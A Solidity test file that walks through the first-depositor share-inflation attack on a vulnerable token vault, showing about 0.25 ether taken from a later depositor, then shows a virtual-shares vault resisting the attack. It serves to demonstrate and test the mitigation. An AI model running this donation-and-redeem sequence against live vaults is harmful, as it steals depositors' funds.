// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "../src/VulnerableVault.sol";

contract InflationAttackTest {
    MockWETH public token;
    VulnerableVault public vulnerableVault;
    SecureVault public secureVault;

    event AttackOutcome(string vaultType, uint256 victimDeposited, uint256 attackerExtractedProfit);

    function setUp() public {
        token = new MockWETH();
        vulnerableVault = new VulnerableVault(address(token));
        secureVault = new SecureVault(address(token));

        token.approve(address(vulnerableVault), type(uint256).max);
        token.approve(address(secureVault), type(uint256).max);
    }

    receive() external payable {}

    // Case 1: Attacker extracts direct profit from victim using Inflation / First Depositor Attack
    function test_01_VulnerableVault_AttackerProfitsFromVictim() public {
        // Mint tokens to this test contract (attacker context)
        token.mint(address(this), 10 ether);

        // --- STEP 1: Attacker deposits 1 wei ---
        // Attacker gets 1 share
        vulnerableVault.deposit(1, address(this));
        require(vulnerableVault.balanceOf(address(this)) == 1, "Attacker should have 1 share");

        // --- STEP 2: Attacker directly DONATES 1 ether of tokens to vault ---
        // Vault totalAssets = 1 ether + 1 wei, totalShares = 1
        // Share Price is now inflated: 1 share = 1 ether + 1 wei
        token.transfer(address(vulnerableVault), 1 ether);

        // --- STEP 3: Victim deposits 1.5 ether ---
        // Victim gets: (1.5e18 * 1) / (1e18 + 1) = 1 share!
        vulnerableVault.deposit(1.5 ether, address(this)); // Mint 1 share for 1.5 ETH!
        require(vulnerableVault.balanceOf(address(this)) == 2, "Total shares should be 2");

        // Total in vault: 1 wei + 1 ether (donation) + 1.5 ether (victim) = 2.5 ether + 1 wei
        // Total shares: 2

        // --- STEP 4: Attacker redeems their 1 share ---
        // Attacker assets = (1 share * 2.5 ether) / 2 shares = 1.25 ether!
        // Attacker spent: 1 wei + 1 ether = 1 ether
        // Attacker receives: 1.25 ether
        // NET PROFIT FOR ATTACKER = +0.25 ether stolen directly from victim!
        uint256 attackerTokensBefore = token.balanceOf(address(this));
        vulnerableVault.redeem(1, address(this));
        uint256 attackerTokensAfter = token.balanceOf(address(this));

        uint256 extracted = attackerTokensAfter - attackerTokensBefore;
        uint256 netProfit = extracted - 1 ether; // Subtract initial 1 ETH donation

        emit AttackOutcome("Vulnerable Vault (No Virtual Shares)", 1.5 ether, netProfit);
        require(netProfit > 0.24 ether, "Attacker should have extracted direct profit");
    }

    // Case 2: Secure Vault with Virtual Shares Mitigates Inflation Attack
    function test_02_SecureVault_MitigatesInflationAttack() public {
        token.mint(address(this), 10 ether);

        // First deposit with virtual offset
        uint256 initialShares = secureVault.deposit(1 ether, address(this));
        require(initialShares > 0, "Initial deposit succeeded");

        // Donation attempt
        token.transfer(address(secureVault), 1 ether);

        // Subsequent depositor is protected
        uint256 secondShares = secureVault.deposit(1 ether, address(this));
        require(secondShares > 0, "Second depositor received proportional shares");
    }
}
